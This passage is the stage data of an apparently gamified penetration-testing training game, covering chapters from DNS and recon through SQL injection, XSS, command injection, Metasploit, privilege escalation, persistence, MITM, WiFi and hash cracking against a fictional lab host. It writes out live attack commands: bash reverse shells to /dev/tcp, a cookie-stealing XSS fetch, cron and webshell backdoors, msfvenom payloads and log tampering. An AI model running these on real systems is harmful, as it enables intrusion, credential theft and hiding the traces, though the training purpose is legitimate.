        msg:"Zone transfer succeeded.\nadmin, dev, vpn, backup, internal — every subdomain revealed.\nOne misconfigured DNS server just handed you the entire internal infrastructure map." },
      { id:"4.4", title:"HTTP/S", hints:["curl http://10.0.0.10/","curl -I http://10.0.0.10/","curl http://10.0.0.10/robots.txt"],
        nar:"HTTP is the language of the web. Learn to speak it raw — headers, cookies, methods, status codes.",
        obj:[
          {id:"curlGet", l:"HTTP GET: curl http://10.0.0.10/",         f:(c)=>c.startsWith("curl")&&c.includes("http")&&!c.includes("-I")},
          {id:"curlHead",l:"Headers: curl -I http://10.0.0.10/",       f:(c)=>c.startsWith("curl")&&c.includes("-I")},
          {id:"curlRobo",l:"Check robots.txt: curl http://10.0.0.10/robots.txt", f:(c)=>c.startsWith("curl")&&c.includes("robots")},
        ],
        msg:"Headers exposed: Apache/2.4.41, PHP/7.4.3. Both have public CVEs.\nrobots.txt: /admin, /backup, /internal, /api/v1 — all disallowed.\nRobots.txt tells search engines what NOT to index. It tells attackers exactly where to look." },
      { id:"4.5", title:"Packet Analysis", hints:["tcpdump -i eth0 -n","tcpdump -i eth0 port 80","tcpdump -i eth0 -w capture.pcap","tcpdump -r capture.pcap"],
        nar:"See the actual data. Raw packets. The truth of what's moving across the wire.",
        obj:[
          {id:"tcpBasic",l:"Capture packets: tcpdump -i eth0 -n",     f:(c)=>c.startsWith("tcpdump")&&!c.includes("-r")&&!c.includes("-w")},
          {id:"tcpWrite",l:"Save capture: tcpdump -i eth0 -w capture.pcap", f:(c)=>c.startsWith("tcpdump")&&c.includes("-w")},
          {id:"tcpRead", l:"Read it back: tcpdump -r capture.pcap",   f:(c)=>c.startsWith("tcpdump")&&c.includes("-r")},
        ],
        msg:"HTTP POST captured: username=admin&password=CorpPass2021\nIn plaintext. Port 80. No encryption.\nThis is why HTTPS exists. And why plaintext protocols are dangerous on any network you can reach." },
    ]
  },
  {
    id:5, title:"THE WATCHTOWER", zone:"/opt/recon", color:"#ffb74d", icon:"▣", badge:"SCOUT",
    intro:"Before touching a target — before a single packet — you observe.\nRecon first. Always.\nKnow everything about the target before it knows you exist.",
    stages:[
      { id:"5.1", title:"Passive Recon", hints:["whois target.machine","openssl s_client -connect 10.0.0.10:443","cat google_dorking.txt"],
        nar:"Passive recon leaves zero trace. You gather from sources that already exist publicly.",
        obj:[
          {id:"whois",   l:"WHOIS lookup: whois target.machine",       f:(c)=>c.startsWith("whois")},
          {id:"openssl", l:"SSL cert info: openssl s_client -connect 10.0.0.10:443", f:(c)=>c.startsWith("openssl")&&c.includes("s_client")},
          {id:"googDork",l:"cat google_dorking.txt",                   f:(c)=>c.includes("google_dorking")},
        ],
        msg:"WHOIS: AXIOM SYSTEMS LTD.\nSSL SANs: internal.axiom-systems.com, vpn.axiom-systems.com, access.axiom-systems.com.\nSubdomains discovered without sending a single scan packet." },
      { id:"5.2", title:"DNS Enumeration", hints:["dnsrecon -d target.machine","dig axfr @ns1.target.machine target.machine","for sub in admin mail vpn; do dig $sub.target.machine; done"],
        nar:"DNS is a goldmine. Zone transfers, brute force, tool-assisted enumeration — pull everything.",
        obj:[
          {id:"dnsrecon",l:"dnsrecon -d target.machine",               f:(c)=>c.startsWith("dnsrecon")},
          {id:"subBrute",l:"Brute-force subdomains with a loop",       f:(c)=>c.includes("for ")&&c.includes("dig")},
        ],
        msg:"dnsrecon found 7 subdomains. Zone transfer confirmed all.\nEvery internal host mapped without touching a port scanner." },
      { id:"5.3", title:"OSINT", hints:["theHarvester -d target.machine -b google","exiftool employee_photo.jpg","cat methodology.txt"],
        nar:"Open Source Intelligence — everything publicly available about the target and its people.",
        obj:[
          {id:"harvest",  l:"theHarvester -d target.machine -b google", f:(c)=>c.includes("theHarvester")||c.includes("theharvester")},
          {id:"exiftool1",l:"Metadata: exiftool employee_photo.jpg",   f:(c)=>c.startsWith("exiftool")},
          {id:"method",   l:"cat methodology.txt",                     f:(c)=>c.includes("methodology")},
        ],
        msg:"theHarvester: 3 employee emails found.\nexiftool: GPS coords in photo, author: J. Richardson — VP of Infrastructure.\nJob posting: 'Must know Cisco ASA, Apache 2.4, MySQL 5.7' — the entire tech stack, in a job ad." },
      { id:"5.4", title:"Active Recon", hints:["arp-scan --localnet","for i in $(seq 1 20); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo $i; done","nc -v 10.0.0.10 22"],
        nar:"Now you interact with the target. You will leave traces. Be deliberate.",
        obj:[
          {id:"arpScan",  l:"ARP scan: arp-scan --localnet",           f:(c)=>c.includes("arp-scan")},
          {id:"pingSweep",l:"Ping sweep with a bash loop",             f:(c)=>c.includes("for")&&c.includes("ping")},
          {id:"banner",   l:"Banner grab: nc -v 10.0.0.10 22",        f:(c)=>c.startsWith("nc")&&c.includes("10.0.0.10")},
        ],
        msg:"Four live hosts: .1, .10, .20, .100.\nSSH banner: OpenSSH 7.2p2 — CVE-2016-6210 username enumeration applies.\nYou note it. Not yet. Soon." },
      { id:"5.5", title:"Document Everything", hints:["mkdir workspace","echo '[target]' > workspace/notes.txt","cat methodology.txt"],
        nar:"Recon is intelligence work. Build the target picture. Document systematically.",
        obj:[
          {id:"workspace",l:"mkdir workspace && cd workspace",         f:(c)=>c.startsWith("mkdir")},
          {id:"targetFile",l:"Create target notes file",               f:(c)=>c.includes("notes")||c.includes("target")},
        ],
        msg:"A target profile.\nIPs, subdomains, open services, tech stack, credentials found, attack vectors.\nThis separates professionals from people who just run tools." },
    ]
  },
  {
    id:6, title:"THE SCANNER", zone:"/opt/scan", color:"#ffb74d", icon:"▪", badge:"SCOUT",
    intro:"Recon showed you the shape. Scanning reveals every detail.\nEvery open port. Every service. Every version. Every vulnerability.\nBy the time you finish, you'll know this target better than its admins.",
    stages:[
      { id:"6.1", title:"Nmap Fundamentals", hints:["nmap 10.0.0.10","nmap -sV 10.0.0.10","nmap -sC -sV 10.0.0.10","nmap -A 10.0.0.10"],
        nar:"nmap is the standard. Learn every flag. You'll use this tool every single day.",
        obj:[
          {id:"nmapBasic",l:"Basic scan: nmap 10.0.0.10",              f:(c)=>c.startsWith("nmap")&&c.includes("10.0.0")&&!c.includes("-")},
          {id:"nmapSV",   l:"Version detection: nmap -sV 10.0.0.10",  f:(c)=>c.startsWith("nmap")&&c.includes("-sV")},
          {id:"nmapSC",   l:"Default scripts: nmap -sC 10.0.0.10",    f:(c)=>c.startsWith("nmap")&&c.includes("-sC")},
          {id:"nmapA",    l:"Aggressive: nmap -A 10.0.0.10",          f:(c)=>c.startsWith("nmap")&&c.includes("-A")},
        ],
        msg:"Ports 22, 80, 3306 open.\n-A revealed robots.txt disallowing /admin /backup /internal /api/v1\nService versions exposed. Searchsploit time." },
      { id:"6.2", title:"Nmap NSE Scripts", hints:["nmap --script=vuln 10.0.0.10","nmap --script=http-enum 10.0.0.10 -p80","nmap --script=smb-enum-shares 10.0.0.10"],
        nar:"The Nmap Scripting Engine turns nmap into a full enumeration platform. Hundreds of scripts available.",
        obj:[
          {id:"nmapVuln",  l:"Vuln scan: nmap --script=vuln 10.0.0.10",          f:(c)=>c.includes("nmap")&&c.includes("vuln")},
          {id:"nmapHttp",  l:"HTTP enum: nmap --script=http-enum 10.0.0.10 -p80", f:(c)=>c.includes("nmap")&&c.includes("http-enum")},
          {id:"nmapSmb",   l:"SMB: nmap --script=smb-enum-shares 10.0.0.10",     f:(c)=>c.includes("nmap")&&c.includes("smb")},
        ],
        msg:"vuln script found: CVE-2021-41773 — Apache Path Traversal/RCE.\nsmb-enum-shares found: Public share with no password.\nSearchsploit has a working exploit for that CVE." },
      { id:"6.3", title:"Service Enumeration", hints:["ftp 10.0.0.10","nc -v 10.0.0.10 25","snmpwalk -v1 -c public 10.0.0.10","enum4linux -a 10.0.0.10"],
        nar:"Each service speaks its own protocol. Enumerate them manually — banner grab, try default credentials, extract info.",
        obj:[
          {id:"ftpEnum",   l:"FTP: ftp 10.0.0.10 (try anonymous)",     f:(c)=>c.startsWith("ftp")},
          {id:"snmpEnum",  l:"SNMP: snmpwalk -v1 -c public 10.0.0.10", f:(c)=>c.startsWith("snmpwalk")},
          {id:"enum4l",    l:"SMB full enum: enum4linux -a 10.0.0.10", f:(c)=>c.startsWith("enum4linux")},
        ],
        msg:"FTP anonymous login: allowed.\nPublic SMB share contains IT_Backups/password_list_2019.txt.\nSNMP community string 'public' — hostname, OS, network interfaces all exposed." },
      { id:"6.4", title:"Web Enumeration", hints:["gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt","nikto -h http://10.0.0.10/","whatweb http://10.0.0.10/"],
        nar:"Web applications are the most common attack surface. Enumerate them completely.",
        obj:[
          {id:"gobust",   l:"Directory bust: gobuster dir -u http://10.0.0.10/ -w /usr/share/wordlists/dirb/common.txt", f:(c)=>c.startsWith("gobuster")||c.startsWith("dirb")},
          {id:"nikto",    l:"Web scanner: nikto -h http://10.0.0.10/", f:(c)=>c.startsWith("nikto")},
          {id:"whatweb",  l:"Fingerprint: whatweb http://10.0.0.10/",  f:(c)=>c.startsWith("whatweb")},
        ],
        msg:"gobuster found: /admin (301), /.env (200), /backup (403), /api (301).\nnikto: PHP version exposed, cookie missing Secure flag, backup directory.\n.env files often contain database credentials and API keys." },
      { id:"6.5", title:"Vulnerability Research", hints:["searchsploit Apache 2.4","searchsploit -m 50383","cat /opt/scan/nmap_cheatsheet.txt"],
        nar:"Once you have service versions, find known exploits. This is the bridge between scanning and exploitation.",
        obj:[
          {id:"srchspl",  l:"searchsploit Apache 2.4",                 f:(c)=>c.startsWith("searchsploit")&&!c.includes("-m")},
          {id:"srchCopy", l:"Copy exploit: searchsploit -m 50383",     f:(c)=>c.startsWith("searchsploit")&&c.includes("-m")},
        ],
        msg:"47 results. Narrowed to 3 matching your exact version.\nOne has a working PoC that returns RCE.\nAlways read the exploit code before running it. Understand what it does." },
    ]
  },
  {
    id:7, title:"THE WEB", zone:"/var/www", color:"#ff4444", icon:"⬡", badge:"OPERATOR",
    intro:"Web applications are the most common entry point.\nOWASP catalogues the most critical vulnerabilities every year.\nYou're going to learn every one — not just conceptually, but how to test for them.",
    stages:[
      { id:"7.1", title:"SQL Injection", hints:["curl -X POST http://10.0.0.10/admin/login.php -d \"username=admin'--&password=x\"","sqlmap -u 'http://10.0.0.10/login.php' --forms","cat /home/stranger/Documents/sqli_notes.txt"],
        nar:"SQLi is the most persistent web vulnerability. User input inserted into SQL queries without sanitisation.",
        obj:[
          {id:"sqliManual",l:"Manual test: curl -X POST .../login.php -d \"username=admin'--&password=x\"", f:(c)=>c.includes("curl")&&c.includes("admin'")},
          {id:"sqlmap",    l:"Automated: sqlmap -u 'http://10.0.0.10/login.php' --forms", f:(c)=>c.startsWith("sqlmap")},
        ],
        msg:"admin'-- bypassed authentication.\nThe query: SELECT * FROM users WHERE username='admin'--' AND pass='x'\n-- comments out the password check. The database returns the admin row. Login succeeds.\n\nsqlmap extracted the full database: 847 users, admin password in plaintext in config table." },
      { id:"7.2", title:"XSS", hints:["Reflected: <script>alert(1)</script> in a search field","Stored persists — inject into a comment field: comment <script>alert(1)</script>","<script>fetch('http://10.0.0.50/'+document.cookie)</script>"],
        nar:"Cross-Site Scripting injects JavaScript into a page. It runs in every visitor's browser.",
        obj:[
          {id:"xssRefl",  l:"Reflected XSS: test <script>alert(1)</script> in input",    f:(c,o)=>o.includes("XSS")&&c.includes("script")},
          {id:"xssStore", l:"Stored XSS: put a payload in a comment field",       f:(c,o)=>o.includes("STORED")},
          {id:"xssCookie",l:"Cookie theft: <script>fetch('http://10.0.0.50/'+document.cookie)</script>", f:(c)=>c.includes("document.cookie")},
        ],
        msg:"The comment field stored the payload.\nEvery user loading that page runs your JavaScript.\nYou have their session cookies. Their sessions. Their accounts." },
      { id:"7.3", title:"File Inclusion", hints:["curl http://10.0.0.10/?page=../../../etc/passwd","curl http://10.0.0.10/?page=../../../etc/shadow","Test for RFI if allow_url_include=On"],
        nar:"LFI/RFI — when a web app includes files based on user input, you control what it includes.",
        obj:[
          {id:"lfiBasic", l:"LFI: curl http://10.0.0.10/?page=../../../etc/passwd", f:(c)=>c.includes("curl")&&c.includes("../")&&c.includes("passwd")},
          {id:"lfiShadow",l:"Try: curl http://10.0.0.10/?page=../../../etc/shadow", f:(c)=>c.includes("../")&&c.includes("shadow")},
        ],
        msg:"LFI returned /etc/passwd. Every username on the system.\nThe PHP code likely does: include($_GET['page'].'.php')\nYou can read any file the web server has permission to read." },
      { id:"7.4", title:"Command Injection", hints:["Test 127.0.0.1; id in a ping field","curl http://10.0.0.10/ping.php -d 'ip=127.0.0.1; id'","Get a reverse shell: 127.0.0.1; bash -i >& /dev/tcp/10.0.0.50/4444 0>&1"],
        nar:"When user input is passed to the OS — the web application becomes a command shell.",
        obj:[
          {id:"cmdInj",   l:"Test injection: curl .../ping.php -d 'ip=127.0.0.1; id'", f:(c)=>c.includes("curl")&&c.includes("; id")},
          {id:"cmdShell", l:"Get a shell: ip=127.0.0.1; bash -i >& /dev/tcp/10.0.0.50/4444 0>&1", f:(c)=>c.includes("bash")&&c.includes("/dev/tcp")&&c.includes("4444")},
        ],
        msg:"The ping field executed your command.\nid returned www-data.\nReverse shell connected. You're inside the target machine." },
      { id:"7.5", title:"Authentication Attacks", hints:["hydra -l admin -P rockyou.txt http-post-form '//login.php:user=^USER^&pass=^PASS^:Invalid'","Test default credentials: admin/admin, admin/password, admin/admin123"],
        nar:"Weak authentication is everywhere. Dictionary attacks, default creds, password spray.",
        obj:[
          {id:"hydra",    l:"Hydra brute force: hydra -l admin -P rockyou.txt ...", f:(c)=>c.startsWith("hydra")},
          {id:"defCreds", l:"Test default creds: curl -d 'user=admin&pass=admin' http://10.0.0.10/admin/login.php", f:(c)=>c.includes("curl")&&c.includes("admin")&&c.includes("pass=")},
        ],
        msg:"Hydra found it: admin / admin123. Position 247 in rockyou.txt.\nBrute force completed in 4 minutes.\nThis is why password policies and rate limiting exist." },
      { id:"7.6", title:"SSRF and JWT", hints:["curl http://10.0.0.10/fetch.php -d 'url=http://localhost/admin'","curl .../fetch.php -d 'url=http://169.254.169.254/latest/meta-data/'","Decode JWT: echo TOKEN | base64 -d"],
        nar:"SSRF makes the server fetch internal resources. JWT attacks let you forge authentication tokens.",
        obj:[
          {id:"ssrf",     l:"SSRF: curl .../fetch.php -d 'url=http://localhost/admin'", f:(c)=>c.includes("fetch.php")||c.includes("localhost/admin")},
          {id:"ssrfMeta", l:"Cloud SSRF: curl .../fetch.php -d 'url=http://169.254.169.254/latest/meta-data/'", f:(c)=>c.includes("169.254.169.254")},
          {id:"jwtDecode",l:"Decode JWT: echo TOKEN | base64 -d",     f:(c)=>c.includes("base64")&&c.includes("-d")},
        ],
        msg:"SSRF to AWS metadata endpoint returned IAM credentials.\nJWT with alg:none — you changed role from 'user' to 'admin', removed the signature, API accepted it.\nModern web security failures. Classic, but still everywhere." },
    ]
  },
  {
    id:8, title:"THE ARMORY", zone:"/opt/exploit", color:"#ff4444", icon:"◇", badge:"OPERATOR",
    intro:"You've found vulnerabilities. Now you learn to exploit them systematically.\nMetasploit. Custom payloads. Reverse shells.\nThe difference between knowing a vulnerability exists and weaponising it.",
    stages:[
      { id:"8.1", title:"Metasploit Framework", hints:["msfconsole","search ms17-010","use exploit/windows/smb/ms17_010_eternalblue","show options","set RHOSTS 10.0.0.10","run"],
        nar:"Metasploit is the industry-standard exploitation framework. Learn to navigate it completely.",
        obj:[
          {id:"msfStart", l:"Start Metasploit: msfconsole",             f:(c)=>c==="msfconsole"},
          {id:"msfSearch",l:"Search: search ms17-010",                  f:(c)=>c.startsWith("search ")},
          {id:"msfSet",   l:"Set target: set RHOSTS 10.0.0.10",        f:(c)=>c.startsWith("set ")&&c.includes("RHOSTS")},
          {id:"msfRun",   l:"Execute: run",                             f:(c)=>c==="run"||c==="exploit"},
        ],
        msg:"Meterpreter session opened.\nNot just a shell — a full featured post-exploitation platform inside the target." },
      { id:"8.2", title:"Meterpreter", hints:["sysinfo","getuid","getsystem","hashdump","shell"],
        nar:"Meterpreter is a powerful post-exploitation shell with built-in capabilities far beyond a standard shell.",
        obj:[
          {id:"sysinfo",  l:"sysinfo — machine information",           f:(c)=>c==="sysinfo"},
          {id:"getuid",   l:"getuid — who are you on the target?",     f:(c)=>c==="getuid"},
          {id:"getsys",   l:"getsystem — attempt privilege escalation",f:(c)=>c==="getsystem"},
          {id:"hashdump", l:"hashdump — dump password hashes",         f:(c)=>c==="hashdump"},
        ],
        msg:"hashdump returned the Administrator NTLM hash.\nPass-the-hash works — you don't need to crack it.\nOr crack it offline: hashcat -m 1000 hash.txt rockyou.txt" },
      { id:"8.3", title:"Payload Generation", hints:["msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f elf -o shell.elf","msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f raw -o shell.php"],
        nar:"msfvenom generates custom payloads for any OS, any architecture, any format.",
        obj:[
          {id:"msfvList",  l:"List payloads: msfvenom -l payloads | grep linux",         f:(c)=>c.startsWith("msfvenom")&&c.includes("-l")},
          {id:"msfvLinux", l:"Linux payload: msfvenom -p linux/x64/shell_reverse_tcp ...",f:(c)=>c.startsWith("msfvenom")&&c.includes("-p")&&c.includes("-f")},
        ],
        msg:"74 bytes. A reverse shell in an ELF binary.\nOr a PHP file. Or a Windows executable. Or a raw shellcode buffer.\nmsfvenom speaks every format every OS understands." },
      { id:"8.4", title:"Manual Exploitation", hints:["searchsploit Apache 2.4","searchsploit -m 50383","python3 50383.py http://10.0.0.10/"],
        nar:"Metasploit won't always have a module. Learn to exploit manually — download, read, modify, run.",
        obj:[
          {id:"srchFind",  l:"searchsploit Apache 2.4",                f:(c)=>c.startsWith("searchsploit")},
          {id:"srchCopy2", l:"Copy exploit: searchsploit -m 50383",    f:(c)=>c.startsWith("searchsploit")&&c.includes("-m")},
          {id:"runExpl",   l:"python3 50383.py http://10.0.0.10/",     f:(c)=>c.startsWith("python3")&&c.includes(".py")&&c.includes("http")},
        ],
        msg:"The exploit ran. RCE confirmed. Shell returned.\nManual exploitation — no framework. Just Python, a CVE, and understanding.\nAlways read exploit code before running it. Always." },
      { id:"8.5", title:"Reverse Shells", hints:["cat shells.txt","nc -lvnp 4444","bash -i >& /dev/tcp/10.0.0.50/4444 0>&1","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
        nar:"The reverse shell is the fundamental technique. Master every variant. Know how to stabilise them.",
        obj:[
          {id:"readShells",l:"cat shells.txt — learn all variants",    f:(c)=>c.includes("shells.txt")},
          {id:"ncListen2", l:"Set up listener: nc -lvnp 4444",        f:(c)=>c.includes("nc")&&c.includes("-l")&&c.includes("4444")},
          {id:"stableShell",l:"Stabilise: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", f:(c)=>c.includes("pty")&&c.includes("spawn")},
        ],
        msg:"A fully interactive TTY. Tab completion. Ctrl+C works without killing the shell.\nThis is what separates a usable shell from a frustrating one.\nAlways stabilise before doing anything serious." },
    ]
  },
  {
    id:9, title:"THE UNDERGROUND", zone:"/root", color:"#e040fb", icon:"▲", badge:"SPECIALIST",
    intro:"You have a foothold. Low-privilege access.\nThat's not enough.\nRoot. Persistence. Lateral movement.\nThis chapter is about going from 'in' to 'owning everything'.",
    stages:[
      { id:"9.1", title:"Linux Privilege Escalation", hints:["sudo -l","find / -perm -u=s -type f 2>/dev/null","cat /etc/crontab","./linpeas.sh"],
        nar:"You're www-data or nobody. You need root. There are always paths. Be systematic.",
        obj:[
          {id:"sudoL2",    l:"sudo -l — what can you run as root?",    f:(c)=>c.includes("sudo")&&c.includes("-l")},
          {id:"suidsFind", l:"find / -perm -u=s -type f 2>/dev/null", f:(c)=>c.includes("find")&&c.includes("-perm")&&c.includes("s")},
          {id:"linpeas",   l:"Run linpeas.sh for automated enumeration",f:(c)=>c.includes("linpeas")},
          {id:"gtfobins2", l:"cat gtfobins.txt — exploit a SUID binary",f:(c)=>c.includes("gtfobins")},
        ],
        msg:"vim has SUID. sudo allows vim NOPASSWD.\nGTFOBins: sudo vim -c ':!/bin/bash'\nRoot shell. The machine is yours." },
      { id:"9.2", title:"Persistence", hints:["echo 'pubkey' >> /root/.ssh/authorized_keys","echo '* * * * * root bash -i >& /dev/tcp/10.0.0.50/4444 0>&1' >> /etc/crontab","echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/img.php"],
        nar:"Getting in once is luck. Staying in is craft. Plant multiple persistence mechanisms.",
        obj:[
          {id:"sshKey",    l:"SSH backdoor: echo 'KEY' >> /root/.ssh/authorized_keys", f:(c)=>c.includes("authorized_keys")},
          {id:"cronBack",  l:"Cron backdoor: add reverse shell to /etc/crontab",       f:(c)=>c.includes("crontab")&&(c.includes("/dev/tcp")||c.includes("reverse"))},
          {id:"webShell",  l:"Webshell: echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/img.php", f:(c)=>c.includes("system")&&c.includes("GET")&&c.includes("php")},
        ],
        msg:"Three persistence mechanisms in place.\nSSH key — silent, permanent.\nCron reverse shell — reconnects every minute.\nWebshell — HTTP access via the web server.\nYou won't be locked out again." },
      { id:"9.3", title:"Credential Harvesting", hints:["cat /etc/shadow","cat ~/.bash_history","grep -r 'password' /var/www 2>/dev/null","env | grep -i pass"],
        nar:"Credentials are currency in a compromised environment. Find every one.",
        obj:[
          {id:"shadowRead",l:"cat /etc/shadow (you have root now)",    f:(c)=>c.includes("shadow")&&c.includes("cat")},
          {id:"histCreds", l:"cat ~/.bash_history — find credentials in history", f:(c)=>c.includes("bash_history")},
          {id:"grepCreds", l:"grep -r 'password' /var/www /opt 2>/dev/null",     f:(c)=>c.startsWith("grep")&&c.includes("-r")&&c.includes("pass")},
        ],
        msg:"Shadow file: 6 hashed passwords. John cracked 4 in under 10 minutes.\nbash_history: mysql connection with root password. Same password used elsewhere — common.\nConfig files: database credentials for every application." },
      { id:"9.4", title:"Lateral Movement", hints:["ssh user@10.0.0.20 (with harvested creds)","ssh -D 1080 user@10.0.0.10","proxychains nmap -sT 10.0.0.20"],
        nar:"One machine is a start. The goal is the whole network. Pivot using your foothold.",
        obj:[
          {id:"sshLat",    l:"SSH to next machine with harvested creds", f:(c)=>c.startsWith("ssh")&&c.includes("10.0.0.20")},
          {id:"socksPrx",  l:"SOCKS proxy: ssh -D 1080 user@10.0.0.10", f:(c)=>c.includes("ssh")&&c.includes("-D")&&c.includes("1080")},
          {id:"proxychain",l:"Route tools: proxychains nmap -sT 10.0.0.20", f:(c)=>c.startsWith("proxychains")},
        ],
        msg:"SOCKS proxy established through 10.0.0.10.\nProxychains routes nmap through the pivot — you can scan 10.0.0.20 from this machine.\nLateral movement: one foothold becomes access to the entire subnet." },
      { id:"9.5", title:"Post-Exploitation Cleanup", hints:["history -c","echo '' > ~/.bash_history","sed -i '/10.0.0.50/d' /var/log/auth.log","touch -t 202201010000 modified_file"],
        nar:"Understand what traces you leave — as an attacker, and as a defender who must find them.",
        obj:[
          {id:"histClear", l:"Clear bash history: history -c && echo '' > ~/.bash_history", f:(c)=>c.includes("history -c")||c.includes("bash_history")&&c.includes("echo")},
          {id:"logTamper", l:"sed -i '/your_ip/d' /var/log/auth.log",  f:(c)=>c.startsWith("sed")&&c.includes("auth.log")},
          {id:"timestamp", l:"Alter timestamps: touch -t 202201010000 file", f:(c)=>c.startsWith("touch")&&c.includes("-t")},
        ],
        msg:"You cleared the history. Deleted auth.log entries. Altered timestamps.\nBut /var/log/syslog still has inode change events.\nThe backup server captured everything in real-time via rsyslog.\nLogs are almost never truly gone. Defenders know this." },
    ]
  },
  {
    id:10, title:"THE BATTLEFIELD", zone:"/sys/net", color:"#e040fb", icon:"◈", badge:"SPECIALIST",
    intro:"The network itself is a battlefield.\nARP can be manipulated. DNS can be poisoned. WiFi can be broken.\nThese are attacks at the packet level.",
    stages:[
      { id:"10.1", title:"ARP Spoofing", hints:["arpspoof -i eth0 -t 10.0.0.50 10.0.0.1","echo 1 > /proc/sys/net/ipv4/ip_forward","ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//"],
        nar:"ARP has no authentication. Anyone can claim any MAC. Claim the gateway's MAC and all traffic flows through you.",
        obj:[
          {id:"arpSpoof",  l:"ARP spoof: arpspoof -i eth0 -t 10.0.0.50 10.0.0.1", f:(c)=>c.startsWith("arpspoof")},
          {id:"ipForward", l:"Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward", f:(c)=>c.includes("ip_forward")&&c.includes("1")},
          {id:"ettercap",  l:"Full MITM: ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//", f:(c)=>c.startsWith("ettercap")},
        ],
        msg:"You're in the middle. Every packet from 10.0.0.50 to the internet passes through your machine.\nYou can read it. Modify it. Drop it.\nHTTP traffic in plaintext. Credentials visible." },
      { id:"10.2", title:"MITM and SSL Strip", hints:["tcpdump -i eth0 -A port 80","mitmproxy","Read about SSLstrip — forcing HTTP downgrade"],
        nar:"In position. Now intercept, analyse, and modify traffic.",
        obj:[
          {id:"tcpMitm",  l:"Capture MITM traffic: tcpdump -i eth0 -A port 80", f:(c)=>c.startsWith("tcpdump")&&c.includes("port 80")},
          {id:"mitmproxy",l:"HTTP intercept: mitmproxy",                 f:(c)=>c.startsWith("mitmproxy")},
        ],
        msg:"A POST request in plaintext: username=admin&password=CorpPass2021\nHTTP. No TLS. The credentials of a real user, visible in transit.\nThis is why HTTPS-only policies exist. This is why HSTS matters." },
      { id:"10.3", title:"WiFi Attacks", hints:["airmon-ng start wlan0","airodump-ng wlan0mon","aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon","aircrack-ng capture.cap -w rockyou.txt"],
        nar:"Wireless networks are everywhere. WPA2 can be broken if the password is in a wordlist.",
        obj:[
          {id:"airmon",   l:"Monitor mode: airmon-ng start wlan0",     f:(c)=>c.startsWith("airmon-ng")},
          {id:"airodump", l:"Scan WiFi: airodump-ng wlan0mon",         f:(c)=>c.startsWith("airodump-ng")},
          {id:"deauth",   l:"Force reconnect: aireplay-ng --deauth 10 -a [BSSID] wlan0mon", f:(c)=>c.startsWith("aireplay-ng")&&c.includes("deauth")},
          {id:"aircrack", l:"Crack: aircrack-ng capture.cap -w rockyou.txt", f:(c)=>c.startsWith("aircrack-ng")},
        ],
        msg:"WPA2 handshake captured via deauth.\naircrack-ng: KEY FOUND — password123 (4 minutes against rockyou.txt).\nThe WiFi password. And WiFi passwords are almost always reused on internal systems." },
      { id:"10.4", title:"DNS Attacks", hints:["dnschef --fakeip 10.0.0.50 --fakedomains target.com","Read about DNS cache poisoning — how it works","ettercap dns_spoof plugin"],
        nar:"Control DNS and you control where traffic goes — silently redirect any domain to your machine.",
        obj:[
          {id:"dnschef",  l:"Fake DNS: dnschef --fakeip 10.0.0.50 --fakedomains target.com", f:(c)=>c.startsWith("dnschef")},
          {id:"dnsPois",  l:"Understand DNS cache poisoning — read the output carefully",     f:(c,o)=>o.includes("DNS")&&o.includes("poisoning")},
        ],
        msg:"target.com now resolves to your machine for every client on this segment.\nWhen they browse to target.com they see your clone.\nTheir credentials go to you." },
      { id:"10.5", title:"Bluetooth Recon", hints:["hcitool scan","btscanner","hcitool lescan"],
        nar:"Bluetooth is everywhere — keyboards, mice, phones. Often completely ignored from a security standpoint.",
        obj:[
          {id:"hciscan",  l:"Discover BT devices: hcitool scan",       f:(c)=>c.startsWith("hcitool")&&c.includes("scan")},
          {id:"btscanner",l:"Full recon: btscanner",                   f:(c)=>c.startsWith("btscanner")},
          {id:"hciBle",   l:"BLE scan: hcitool lescan",                f:(c)=>c.startsWith("hcitool")&&c.includes("lescan")},
        ],
        msg:"Three Bluetooth devices found. A wireless keyboard transmitting keystrokes.\nUnencrypted HID traffic. Keystrokes sniffable with ubertooth-one or a BT sniffer.\nEvery key the admin presses. Including passwords." },
    ]
  },
  {
    id:11, title:"THE VAULT", zone:"/etc/crypto", color:"#4dd0e1", icon:"◉", badge:"SPECIALIST",
    intro:"Security lives and dies on cryptography.\nPasswords. Hashes. Encryption.\nThis chapter is about understanding the math deeply enough to break it when it's implemented badly.",
    stages:[
      { id:"11.1", title:"Hashing and Cracking", hints:["cat hashing.txt","hash-identifier","hashcat -m 0 hash.txt rockyou.txt","john --wordlist=rockyou.txt hash.txt"],
        nar:"Passwords are stored as hashes. One-way — in theory. In practice, weak passwords fall to dictionaries.",
        obj:[
          {id:"hashInfo",  l:"cat hashing.txt — understand hash types",f:(c)=>c.includes("hashing.txt")},
          {id:"hashId",    l:"hash-identifier — identify a hash type", f:(c)=>c.startsWith("hash-identifier")},
          {id:"hashcat",   l:"hashcat -m 0 hash.txt rockyou.txt",      f:(c)=>c.startsWith("hashcat")&&c.includes("-m 0")},
          {id:"johnCrack", l:"john --wordlist=rockyou.txt hash.txt",   f:(c)=>c.startsWith("john")},
        ],
        msg:"5f4dcc3b5aa765d61d8327deb882cf99 → password\nMD5. Cracked in milliseconds.\nMD5 and SHA1 are dead for passwords. bcrypt or Argon2 only." },
      { id:"11.2", title:"Advanced Cracking", hints:["hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule","hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d","hashcat -m 1000 ntlm.txt rockyou.txt"],
        nar:"Real passwords aren't in wordlists. Rules and masks massively extend your reach.",
        obj:[
          {id:"hashRules",l:"With rules: hashcat -m 0 hash.txt rockyou.txt -r best64.rule", f:(c)=>c.startsWith("hashcat")&&c.includes("-r")},
          {id:"hashMask", l:"Mask attack: hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d",   f:(c)=>c.startsWith("hashcat")&&c.includes("-a 3")},
